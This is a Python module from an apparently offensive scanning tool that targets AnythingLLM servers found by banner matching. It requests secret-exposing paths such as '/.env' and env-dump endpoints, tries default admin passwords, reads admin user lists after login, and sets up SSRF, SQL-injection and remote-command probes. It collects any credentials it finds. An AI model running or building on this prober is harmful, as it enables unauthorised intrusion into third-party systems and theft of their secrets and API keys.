"""AnythingLLM prober — system/config exposure + default admin weak password."""

from __future__ import annotations

import logging
from typing import Any

from aipocket.core.models import Credential

from ..base import Prober
from ..capability import ProbeSpec, RiskLevel, VulnClass
from ._l2l3 import rce_spec, sqli_spec, ssrf_spec

log = logging.getLogger(__name__)

SPECS = [
    ProbeSpec(
        id="anythingllm.unauth",
        product="anythingllm",
        vuln_class=VulnClass.UNAUTH_READ,
        risk_level=RiskLevel.L0,
        entry={
            "paths": [
                "/api/system/env-dump",
                "/api/env-dump",
                "/api/system",
                "/api/system/check-token",
                "/api/setup-complete",
                "/api/v1/system",
                "/.env",
            ],
            "tag_prefix": "anythingllm",
        },
        max_requests=8,
    ),
    ProbeSpec(
        id="anythingllm.weak_password",
        product="anythingllm",
        vuln_class=VulnClass.WEAK_PASSWORD,
        risk_level=RiskLevel.L1,
        entry={
            "auth_style": "login_json",
            "login": "/api/request-token",
            "body": {"username": "{user}", "password": "{pass}"},
            "token_fields": ["token", "access_token", "JWT", "jwt"],
            "post_auth_paths": [
                "/api/system",
                "/api/system/env-dump",
                "/api/workspace",
                "/api/v1/admin/users",
            ],
            "extra_credentials": [
                ("admin", "password"),
                ("mintplexlabs", "password"),
            ],
        },
        max_requests=12,
    ),
    # L2/L3 minimal surfaces
    ssrf_spec(
        "anythingllm",
        path="/api/workspace/upload-link",
        url_param="link",
        body={},
        use_auth=True,
        suffix="ssrf_upload_link",
    ),
    sqli_spec(
        "anythingllm",
        path="/api/workspaces",
        param="slug",
        use_auth=True,
        suffix="sqli_workspaces",
    ),
    rce_spec(
        "anythingllm",
        path="/api/system/run-command",
        param="command",
        use_auth=True,
        suffix="rce_system",
    ),

]


class AnythingLLMProber(Prober):
    product_name = "anythingllm"

    @classmethod
    def identify(cls, hit: dict[str, Any]) -> bool:
        blob = (hit.get("title", "") + hit.get("header", "") + hit.get("banner", "")).lower()
        return "anythingllm" in blob or "anything llm" in blob or "mintplexlabs" in blob

    async def probe(self, hit: dict[str, Any]) -> list[Credential]:
        return await self.run_specs(hit, SPECS)
